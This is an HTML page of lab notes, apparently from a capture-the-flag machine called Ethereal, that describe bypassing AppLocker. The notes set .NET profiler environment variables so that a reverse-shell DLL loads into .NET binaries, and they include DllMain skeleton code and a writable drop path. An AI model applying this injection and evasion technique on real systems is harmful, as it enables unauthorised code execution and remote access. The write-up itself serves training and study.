@@ -1,0 +1,57 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Ethereal AppLocker Bypass</title>
+</head><body>Any random binary such as:<br/>
+tzsync<br/>
+<br/>
+C:&gt; set COR_ENABLE_PROFILING=1<br/>
+<br/>
+COR_PROFILER_PATH=c:\users\ippsec\a.dll<br/>
+<br/>
+COR_ENABLE_PROFILING --&gt; 1 to enable the profiler, 0 to disable.<br/>
+COR_PROFILER --&gt; If COR_ENABLE_PROFILING is 1 then CLR check the CLSID/ProgID of the profiler.<br/>
+COR_PROFILER_PATH --&gt; Path to the profiler's DLL.<br/>
+<br/>
+Profilling will inject the dll at the path during every v4 .NET binary execution<br/>
+In earlier versions, this was a HKLM setting, but is now accessible in the PATH!<br/>
+<br/>
+Let's create a rev shell binary:<br/>
+Visual Studio &gt; New project &gt; Add C++<br/>
+Google a c++ rev shell github windows: https://github.com/tudorthe1ntruder/reverse-shell-poc<br/>
+<br/>
+Don't need an executable, we're making a dll, so on line 12, remove int man(int argc, char *argv[]) and replace with:<br/>
+void RevShell()<br/>
+<br/>
+Create new header file (revshell.h)<br/>
+=======================================================================<br/>
+#pragma once<br/>
+<br/>
+void RevShell();<br/>
+=======================================================================<br/>
+<br/>
+Creat new main (c++ file dllmain.cpp)<br/>
+=======================================================================<br/>
+#include &lt;Windows.h&gt;<br/>
+#include "revshell.h"<br/>
+<br/>
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fwdReason, LPVOID lpReservered)<br/>
+{<br/>
+&nbsp; &nbsp; switch(fwdReason)<br/>
+&nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; case DLL_PROCESS_ATTACH:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; RevShell();<br/>
+&nbsp; &nbsp; case DLL_PROCESS_DETACH:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; break;<br/>
+&nbsp; &nbsp; }<br/>
+}<br/>
+=======================================================================<br/>
+<br/>
+Finally in Visual Studio, select Project &gt; Property &gt; Configuration Type &gt; DLL<br/>
+<br/>
+Now copy this dll to Ethereal and place in C:\Windows\Servicing\Packages\pleasesubscribe.dll<br/>
+(Or other applocker bypass directory)<br/>
+<br/>
+<br/>
+</body></html>
